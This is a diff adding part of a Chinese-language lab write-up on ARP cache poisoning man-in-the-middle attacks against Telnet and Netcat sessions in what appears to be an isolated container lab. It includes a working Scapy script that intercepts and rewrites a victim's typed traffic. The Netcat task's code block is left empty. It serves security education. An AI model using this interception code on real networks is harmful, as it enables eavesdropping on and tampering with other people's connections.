@@ -178,4 +178,75 @@ while True:
 ***
 ### 步骤 4（实施中间人攻击）
 
-保持
+保持 M 中的 IP 转发，并运行程序，在 A 中建立 Telnet 连接：
+
+![](../../../../../assets/Pasted%20image%2020250423141349.png)
+
+关闭 M 中的 IP 转发，在 A 中尝试输入，却发现输入不了任何内容
+
+打开 M 的 IP 转发，先使 A 与 B 建立 Telnet 连接，我们编写 Python 代码：
+
+```python title="ARP_Attack.py"
+from scapy.all import *
+import re
+
+IP_A = "10.9.0.5"
+MAC_A = "ea:9c:17:47:e2:9e"
+IP_B = "10.9.0.6"
+MAC_B = "16:4c:eb:48:1a:7d"
+
+def spoof_pkt(pkt):
+	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+		newpkt = IP(bytes(pkt[IP]))
+		del(newpkt.chksum)
+		del(newpkt[TCP].payload)
+		del(newpkt[TCP].chksum)
+
+		if pkt[TCP].payload:
+			data = pkt[TCP].payload.load
+			data = data.decode()
+			newdata = re.sub(r'[a-zA-Z]', r'Z', data)
+			print(data + " -> " + newdata)
+			send(newpkt / newdata, verbose = False)
+		else:
+			send(newpkt, verbose = False)
+	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+		newpkt = IP(bytes(pkt[IP]))
+		del(newpkt.chksum)
+		del(newpkt[TCP].chksum)
+		send(newpkt, verbose = False)
+
+f = 'tcp and (ether src ea:9c:17:47:e2:9e or ether src 16:4c:eb:48:1a:7d)'
+pkt = sniff(filter = f, prn = spoof_pkt)
+```
+
+关闭 M 的 IP 转发，运行代码，在 A 中输入任何内容都会被替换为 Z：
+
+![](../../../../../assets/Pasted%20image%2020250423150429.png)
+
+在 M 中我们也可以看到效果：
+
+![](../../../../../assets/Pasted%20image%2020250423150449.png)
+
+这表明我们攻击成功
+***
+## 任务 3：使用 ARP 缓存中毒攻击在 Netcat 实施中间人攻击
+
+打开 M 的 IP 转发，在 A 与 B 中建立 Netcat 连接：
+
+![](../../../../../assets/Pasted%20image%2020250424135653.png)
+
+![](../../../../../assets/Pasted%20image%2020250424135714.png)
+
+同理，我们修改上面的代码：
+
+```python title="ARP_Attack.py"
+```
+
+关闭 M 的 IP 转发，运行代码，在 A 中输入带姓氏 `Jin` 的部分都回被替换成 `AAA`：
+
+![](../../../../../assets/Pasted%20image%2020250424135829.png)
+
+![](../../../../../assets/Pasted%20image%2020250424135817.png)
+
+这表明我们攻击成功
